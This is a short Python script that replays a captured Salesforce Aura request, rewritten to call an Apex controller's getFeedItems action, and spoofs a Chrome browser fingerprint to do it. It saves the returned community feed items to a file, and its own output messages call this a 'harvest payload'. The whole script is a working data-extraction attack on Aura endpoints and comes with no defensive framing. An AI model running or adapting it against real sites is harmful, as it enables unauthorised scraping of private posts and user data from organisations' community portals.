import json
from curl_cffi import requests
import urllib.parse

print("[*] Loading captured request structure...")
with open("captured_aura_request.json", "r") as f:
    base_req = json.load(f)

# Use the exact original captured URL and headers
url = base_req["url"]
headers = base_req["headers"]
original_post_data = base_req["post_data"]

parsed_data = dict(urllib.parse.parse_qsl(original_post_data))

# Construct the precise action payload for community feed extraction
target_descriptor = "apex://SupportCommunityFeedController/ACTION$getFeedItems"

message_obj = {
    "actions": [
        {
            "id": "700;a",
            "descriptor": target_descriptor,
            "callingDescriptor": "UNKNOWN",
            "params": {
                "communityId": "",
                "feedFilterType": "All",
                "feedElementType": "FeedItem",
                "sort": "Recent"
            }
        }
    ]
}

parsed_data["message"] = json.dumps(message_obj)
new_post_data = urllib.parse.urlencode(parsed_data)

session = requests.Session()
print(f"[*] Dispatching fully aligned Aura harvest payload to {target_descriptor}...")

res = session.post(url, headers=headers, data=new_post_data, impersonate="chrome120", timeout=15)
print(f"[+] Status Code: {res.status_code} | Length: {len(res.text)}")
print(f"[+] Response Preview:\n{res.text[:2500]}")

with open("harvest_v5_output.json", "w") as out:
    out.write(res.text)

print("[+] Saved response to harvest_v5_output.json")

